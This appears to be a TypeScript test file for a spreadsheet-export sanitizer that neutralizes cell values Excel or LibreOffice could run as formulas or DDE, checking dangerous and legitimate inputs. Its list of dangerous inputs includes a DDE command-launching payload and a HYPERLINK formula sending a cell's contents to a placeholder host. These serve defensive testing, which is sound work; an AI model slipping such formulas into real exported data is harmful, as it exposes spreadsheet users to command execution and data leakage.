// ╔══════════════════════════════════════════════════════╗
// ║  hoja-calculo.utils.spec.ts — Stenbrary v3.62.0      ║
// ║  Neutralizar textos que una hoja de cálculo podría   ║
// ║  ejecutar como fórmula, sin tocar los legítimos.     ║
// ╚══════════════════════════════════════════════════════╝

import { neutralizarCelda, neutralizarFila } from './hoja-calculo.utils';

const NBSP = String.fromCharCode(0xa0);
const ANCHO_COMPLETO = [0xff1d, 0xff0b, 0xff0d, 0xff20].map(c => String.fromCharCode(c)); // ＝ ＋ － ＠

/** Entradas que Excel/LibreOffice pueden interpretar como fórmula o DDE. */
const PELIGROSAS = [
  '=1+1',
  '=HYPERLINK("http://ejemplo.invalid/?d="&A1,"clic")',
  "=cmd|' /C calc'!A0",
  '+1+1',
  '-2+3',
  '@SUM(1,2)',
  '\t=1+1',
  '\r=1+1',
  '\n=1+1',
  ' =1+1',
  `${NBSP}=1+1`,
  ...ANCHO_COMPLETO.map(c => `${c}1+1`),
];

describe('hoja-calculo.utils — neutralizarCelda', () => {
  for (const v of PELIGROSAS) {
    it(`antepone un apóstrofo a ${JSON.stringify(v)}`, () => {
      expect(neutralizarCelda(v)).toBe(`'${v}`);
    });
  }

  it('no toca los textos legítimos', () => {
    for (const v of [
      'José Pérez-López', 'Ana María', 'Lic. en Derecho', 'Estudiar, Investigación',
      '2299990001', 'A', 'Matutino', 'Sí', '', '26/10/2026', '14:05', 'Nunca', '—',
      'a=1', 'Correo: a@b.mx', 'Tel. 867-000-0000',
    ]) {
      expect(neutralizarCelda(v)).withContext(v).toBe(v);
    }
  });

  it('no toca números (ni los negativos), booleanos, null ni undefined', () => {
    for (const v of [0, 45, -5, 3.5, true, false, null, undefined]) {
      expect(neutralizarCelda(v)).withContext(String(v)).toBe(v);
    }
  });

  it('es idempotente: un valor ya neutralizado no cambia otra vez', () => {
    const una = neutralizarCelda('=1+1');
    expect(neutralizarCelda(una)).toBe(una);
  });

  it('neutralizarFila aplica a cada valor, conserva los encabezados y no muta la fila original', () => {
    const fila = { 'Nombre': '=1+1', 'Grado': 3, 'Carrera': 'Derecho' };
    expect(neutralizarFila(fila)).toEqual({ 'Nombre': "'=1+1", 'Grado': 3, 'Carrera': 'Derecho' });
    expect(fila.Nombre).toBe('=1+1');
  });
});
